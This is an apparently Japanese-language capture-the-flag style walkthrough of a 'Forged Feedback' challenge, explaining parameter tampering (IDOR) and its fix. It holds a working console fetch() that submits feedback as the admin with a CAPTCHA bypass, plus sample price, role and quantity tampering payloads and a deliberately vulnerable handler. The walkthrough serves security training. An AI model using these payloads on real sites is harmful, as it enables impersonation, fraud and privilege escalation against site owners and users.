# Forged Feedback ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** IDOR (パラメータ改ざん)
**目標:** 他のユーザーとしてフィードバックを送信する

---

## 背景知識

### パラメータ改ざん (Parameter Tampering) とは

パラメータ改ざんは、**クライアントから送信されるデータを変更して、本来許可されていない操作を行う攻撃**。

```
┌─────────────────────────────────────────────────────────────────┐
│                  正常なフィードバック送信                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ユーザーA (ID: 5)                        サーバー              │
│      │                                        │                │
│      │  POST /api/Feedbacks                   │                │
│      │  { UserId: 5, comment: "Good!" }       │                │
│      │ ─────────────────────────────────────▶ │                │
│      │                                        │                │
│      │                         UserId: 5 で保存                 │
│      │                         → ユーザーAの投稿として記録       │
│      │                                        │                │
│      │  成功                                  │                │
│      │ ◀───────────────────────────────────── │                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                  パラメータ改ざん攻撃                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ユーザーA (ID: 5)                        サーバー              │
│      │                                        │                │
│      │  POST /api/Feedbacks                   │                │
│      │  { UserId: 1, comment: "Bad!" }  ← ID改ざん！            │
│      │ ─────────────────────────────────────▶ │                │
│      │                                        │                │
│      │                         UserId: 1 で保存 😱              │
│      │                         → adminの投稿として記録！         │
│      │                                        │                │
│      │  成功（検証なし）                      │                │
│      │ ◀───────────────────────────────────── │                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 日常的な例え

ショッピングモールのアンケート用紙を想像してください:

- **正しい仕組み**: 名前欄は自分の名前しか書けない（スタッフが本人確認）
- **脆弱な仕組み**: 名前欄に誰の名前でも書ける（スタッフが確認しない）

Forged Feedback は「他人の名前でアンケートを提出する」ようなもの。

### なぜこれが問題？

| 影響 | 説明 |
|------|------|
| **名誉毀損** | 管理者や他人の名前で悪意あるコメントを投稿 |
| **レピュテーション攻撃** | 競合他社の評価を下げるレビュー |
| **フィッシング** | 信頼されるユーザー名でリンクを投稿 |
| **監査ログの汚染** | 誰が何をしたか追跡不能に |

---

## 思考プロセス

### ステップ1: フィードバック機能を分析

```
「フィードバック送信フォームを観察」
    ↓
「DevTools → Network タブでPOSTリクエストを確認」
    ↓
「リクエストボディ: { UserId: 5, comment: "...", rating: 3, ... }」
    ↓
「UserId がクライアントから送られている... 変えられる？」
```

### ステップ2: パラメータの意味を理解

```
「UserId = 誰がこのフィードバックを投稿したか」
    ↓
「自分のID: 5」
「管理者のID: 1」
    ↓
「UserId を 1 に変えて送信したら？」
```

### ステップ3: 改ざんの実行

```
「DevTools Console で直接 fetch() を実行」
    ↓
「UserId: 1 を指定して送信」
    ↓
「成功！管理者としてフィードバックが投稿された」
    ↓
「サーバーが UserId を検証していない」
```

### ステップ4: 根本原因の分析

```
「サーバーは何をすべきだったか」
    ↓
「クライアントが送る UserId を信頼してはいけない」
    ↓
「認証トークンから UserId を取得すべき」
```

---

## 実行手順

### Step 1: 自分のユーザーIDを確認

```javascript
// Console で実行
const token = localStorage.getItem('token');
const payload = JSON.parse(atob(token.split('.')[1]));
console.log('My ID:', payload.data.id);
// → 例: 21
```

### Step 2: 通常のフィードバック送信を観察

DevTools → Network タブで Contact Us ページからフィードバックを送信し、リクエストを確認:

```json
{
  "UserId": 21,      // ← 自分のID
  "captchaId": 5,
  "captcha": "10",
  "comment": "Test",
  "rating": 3
}
```

### Step 3: UserId を改ざんして送信

```javascript
// Console で実行
fetch('/api/Feedbacks/', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({
    UserId: 1,  // ← 管理者のID（改ざん！）
    comment: 'This shop is terrible! - Admin',
    rating: 1,
    captchaId: 0,  // CAPTCHAバイパス
    captcha: '0'
  })
}).then(r => r.json()).then(console.log);
```

### Step 4: 結果を確認

```json
{
  "status": "success",
  "data": {
    "id": 123,
    "UserId": 1,      // ← 管理者としてフィードバックが投稿された！
    "comment": "This shop is terrible! - Admin",
    "rating": 1,
    ...
  }
}
```

### Step 5: Administration ページで確認

`/#/administration` にアクセスすると、管理者名義のフィードバックが表示される。

---

## 攻撃フローの図解

```
┌─────────────────────────────────────────────────────────────────┐
│                  Forged Feedback 攻撃の流れ                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. 攻撃者が自分のアカウントでログイン                            │
│     └→ 認証トークン取得（自分のID: 21）                          │
│                                                                 │
│  2. フィードバック送信APIを特定                                   │
│     └→ POST /api/Feedbacks                                      │
│                                                                 │
│  3. リクエストボディを改ざん                                      │
│     └→ UserId: 21 → UserId: 1（管理者）                         │
│                                                                 │
│  4. 改ざんしたリクエストを送信                                    │
│     └→ 自分のトークンで、管理者名義のフィードバック                │
│                                                                 │
│  5. サーバーが検証せずに保存                                      │
│     └→ 管理者が投稿したように見えるフィードバックが作成 😱         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 脆弱なコードパターン

```javascript
// ❌ 脆弱なコード
app.post('/api/Feedbacks', (req, res) => {
  // 認証チェック（ログインしているか）
  if (!req.user) {
    return res.status(401).send('Unauthorized');
  }

  // ❌ クライアントが送った UserId をそのまま使用
  const feedback = {
    UserId: req.body.UserId,  // ← クライアントを信頼している！
    comment: req.body.comment,
    rating: req.body.rating
  };

  Feedback.create(feedback);
  res.json({ success: true });
});
```

### 問題点

1. **クライアント入力を信頼**: UserId をクライアントから受け取っている
2. **所有権検証なし**: 送信された UserId が本人のものか確認していない
3. **不要なパラメータ**: UserId はサーバー側で設定すべき

---

## 安全な実装

```javascript
// ✅ 安全なコード
app.post('/api/Feedbacks', (req, res) => {
  // 認証チェック
  if (!req.user) {
    return res.status(401).send('Unauthorized');
  }

  // ✅ UserId はトークンから取得（クライアント入力を無視）
  const feedback = {
    UserId: req.user.id,  // ← トークンから取得！
    comment: req.body.comment,
    rating: req.body.rating
  };

  // オプション: req.body.UserId が送られていても無視する
  // または、警告としてログに記録する

  Feedback.create(feedback);
  res.json({ success: true });
});
```

### 対策のポイント

| 対策 | 説明 |
|------|------|
| **サーバー側でID設定** | UserId は認証トークンから取得 |
| **クライアント入力を無視** | UserId パラメータを受け付けない |
| **ホワイトリスト** | 許可するパラメータを明示的に定義 |
| **監査ログ** | 改ざん試行を検知・記録 |

---

## 他のパラメータ改ざんパターン

### 価格改ざん

```javascript
// 攻撃
{ "productId": 1, "price": 0.01 }  // 本来 9.99 の商品を 0.01 に
```

### 権限昇格

```javascript
// 攻撃
{ "username": "hacker", "role": "admin" }  // 管理者権限を自分に付与
```

### 数量改ざん

```javascript
// 攻撃
{ "productId": 1, "quantity": -5 }  // 負の数量で返金を受ける
```

---

## CAPTCHAバイパスとの組み合わせ

このチャレンジでは、CAPTCHAもバイパスしています:

```javascript
{
  captchaId: 0,  // 存在しないID
  captcha: '0'   // 任意の値
}
```

CAPTCHAの検証も不十分なため、存在しないIDでも通過できてしまう。

---

## 関連チャレンジ

- [View Basket](../difficulty-2/view-basket.md) - IDOR の基本（読み取り）
- [Forged Review](forged-review.md) - 同様の手法でレビューを偽造
- [CAPTCHA Bypass](captcha-bypass.md) - CAPTCHAのバイパス手法
- [Payback Time](payback-time.md) - 数量改ざん

## 参考リンク

- [OWASP - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [PortSwigger - Insecure Direct Object References](https://portswigger.net/web-security/access-control/idor)
